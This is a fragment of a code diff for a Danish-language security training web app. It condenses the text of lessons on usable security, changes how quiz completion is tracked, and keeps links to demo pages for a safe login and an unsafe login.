+											<Text fw='bold'>Gør det sikre nemt</Text>
+											<Text size='sm'>Design hvor den sikreste vej er den nemmeste</Text>
 										</List.Item>
 
 										<List.Item>
-											<Text fw='bold'>Gør sikkerhed synlig og forståelig</Text>
-											<Text size='sm'>Giv klare, relevante sikkerhedsfeedback til brugerne. Vis f.eks. adgangskodestyrke i realtid med visuelt feedback.</Text>
+											<Text fw='bold'>Synlig sikkerhed</Text>
+											<Text size='sm'>Giv klar, relevant sikkerhedsfeedback til brugeren</Text>
 										</List.Item>
 
 										<List.Item>
-											<Text fw='bold'>Minimér kognitiv belastning</Text>
-											<Text size='sm'>Reducér mængden af sikkerhedsbeslutninger, brugere skal tage. Brug fornuftige standardindstillinger der favoriserer sikkerhed.</Text>
+											<Text fw='bold'>Reducér valg</Text>
+											<Text size='sm'>Brug sikre standardindstillinger</Text>
 										</List.Item>
 
 										<List.Item>
 											<Text fw='bold'>Design for fejl</Text>
-											<Text size='sm'>Antag at brugere vil lave fejl, og design systemer der kan håndtere disse fejl sikkert. Tillad sikker nulstilling af adgangskoder med flere verifikationstrin.</Text>
+											<Text size='sm'>Systemer der håndterer fejl sikkert</Text>
 										</List.Item>
 									</List>
-
-									<Divider my='md' />
-
-									<Group justify='space-between' mb={16}>
-										<Title order={5}>Citat:</Title>
-										<Badge color='blue'>Indsigt</Badge>
-									</Group>
 
 									<Paper withBorder p='md' radius='md' className='bg-blue-900/40 mb-12 italic'>
 										<Text>"Hvis du tror teknologi kan løse dine sikkerhedsproblemer, forstår du hverken problemerne eller teknologien."</Text>
 										<Text size='sm' ta='right' mt={8}>
-											— Bruce Schneier, Sikkerhedsekspert
+											— Bruce Schneier
 										</Text>
 									</Paper>
-
-									<Button color='blue' onClick={() => markLessonCompleted('psychology')} fullWidth>
-										{isLessonCompleted('psychology') ? (
-											<>
-												<CheckCircle size={18} className='mr-2' weight='fill' />
-												Gennemført
-											</>
-										) : (
-											'Marker som gennemført'
-										)}
-									</Button>
 								</Card>
 							</SimpleGrid>
 
-							{!isLessonCompleted('psychology') && !showQuiz && (
+							{!isQuizCompletedForTab('psychology') && !showQuiz && (
 								<Button color='blue' onClick={() => setShowQuiz(true)} rightSection={<CaretRight size={16} />} fullWidth mt={16}>
-									Tag quizzen for at fortsætte
+									Tag quizzen
 								</Button>
 							)}
 
-							{showQuiz && !isLessonCompleted('psychology') && <QuizComponent question='Hvorfor vælger mange brugere svage adgangskoder selvom de ved det er usikkert?' options={['De har ikke nok teknisk viden', 'De prioriterer bekvemmelighed over sikkerhed', 'De tror ikke deres konti er værdifulde', 'De stoler på at firmaerne beskytter dem']} correctIndex={1} lessonId='psychology' />}
+							{showQuiz && !isQuizCompletedForTab('psychology') && <QuizComponent question='Hvorfor vælger mange brugere svage adgangskoder selvom de ved det er usikkert?' options={['De har ikke nok teknisk viden', 'De prioriterer bekvemmelighed over sikkerhed', 'De tror ikke deres konti er værdifulde', 'De stoler på at firmaerne beskytter dem']} correctIndex={1} lessonId='psychology' />}
 
 							{completedLessons.includes('psychology') && (
 								<Box mt={16}>
@@ -803,15 +740,13 @@ db.query(query, [username, passwordHash]);`}
 										</Group>
 									</Alert>
 
-									<Text mb={16}>Nu er det tid til at se sikkerhedsprincipperne i praksis. Vælg en af mulighederne nedenfor:</Text>
-
 									<SimpleGrid cols={2} spacing='lg'>
 										<Card withBorder className='bg-green-900/20'>
 											<Title order={5} mb={8}>
 												Prøv Sikker Login
 											</Title>
 											<Text size='sm' mb={12}>
-												Se hvordan en sikker loginside implementerer beskyttelse mod forskellige angreb.
+												Se sikkerhedsprincipperne i praksis.
 											</Text>
 											<Button color='green' rightSection={<CaretRight size={16} />} onClick={() => navigate({ to: '/login-safe' })} fullWidth>
 												Gå til Sikker Login
@@ -823,7 +758,7 @@ db.query(query, [username, passwordHash]);`}
 												Prøv Usikker Login
 											</Title>
 											<Text size='sm' mb={12}>
-												Opdag sårbarheder i en usikker loginside og prøv forskellige angreb.
+												Opdag sårbarheder og prøv forskellige angreb.
 											</Text>
 											<Button color='red' rightSection={<CaretRight size={16} />} onClick={() => navigate({ to: '/login-unsafe' })} fullWidth>
 												Gå til Usikker Login
